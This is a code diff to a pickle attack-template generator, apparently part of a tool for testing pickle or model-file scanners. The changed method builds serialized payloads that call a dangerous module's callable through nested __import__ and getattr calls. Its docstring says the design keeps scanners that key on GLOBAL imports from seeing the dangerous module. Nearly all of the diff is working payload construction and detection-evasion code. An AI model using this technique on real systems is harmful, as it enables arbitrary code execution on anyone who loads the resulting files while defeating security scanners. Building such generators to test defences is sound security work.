@@ -174,13 +174,14 @@ class IndirectChainTemplate(AttackTemplate):
 
     Instead of ``GLOBAL <dangerous-module> <sink>``, the stream evaluates::
 
-        __import__('<module>')            # benign global: builtins.__import__
-        getattr(<memoized module>, '<callable>')   # benign global: builtins.getattr
+        __import__('<module>', None, None, ['<callable>'])
+        getattr(<leaf module>, '<callable>')
 
-    then calls the resolved sink with the wrapped payload. No GLOBAL operand
-    ever names the dangerous pair, so scanners keying rules on the GLOBAL
-    import see only ``builtins.__import__`` / ``builtins.getattr``. The
-    import is nested inside the getattr argument region, keeping the stack
+    then calls the resolved sink with the wrapped payload. ``fromlist`` is
+    required so dotted modules resolve to the leaf, not the top-level package.
+    No GLOBAL operand ever names the dangerous pair, so scanners keying rules
+    on the GLOBAL import see only ``builtins.__import__`` / ``builtins.getattr``.
+    The import is nested inside the getattr argument region, keeping the stack
     balanced. Legacy py2 module aliases (``__builtin__``, ``copy_reg``) are
     normalized because ``__import__`` resolves names literally on py3.
     """
@@ -196,22 +197,13 @@ class IndirectChainTemplate(AttackTemplate):
 
     def generate_pickle_payload(self, payload_code: str) -> bytes:
         from pipeline.opcodes import OPCODES_BY_NAME
+        from pipeline.evasion import leaf_import_chain
 
         OP = OPCODES_BY_NAME
-        # Balanced getattr chain: __import__ nested inside the getattr args
-        # region (MARK..TUPLE), so no intermediate module ever stays on the
-        # stack. See pipeline.evasion.IndirectChain for the same pattern.
+        # Balanced getattr chain: __import__(mod, None, None, [name]) nested
+        # inside the getattr args region (MARK..TUPLE). See leaf_import_chain.
         parts: list[bytes] = [
-            OP["GLOBAL"].code + b"builtins\ngetattr\n",
-            OP["MARK"].code,
-            OP["GLOBAL"].code + b"builtins\n__import__\n",
-            pickle.dumps((self.module_name,), protocol=2)[2:-1],
-            OP["REDUCE"].code,
-            OP["SHORT_BINUNICODE"].code + bytes([len(self.callable_name)])
-            + self.callable_name.encode("utf-8"),
-            OP["TUPLE"].code,
-            OP["REDUCE"].code,
-            # sink(*args_for(payload))
+            *leaf_import_chain(self.module_name, self.callable_name),
             pickle.dumps(self._args_for(payload_code), protocol=2)[2:-1],
             OP["REDUCE"].code,
             OP["STOP"].code,
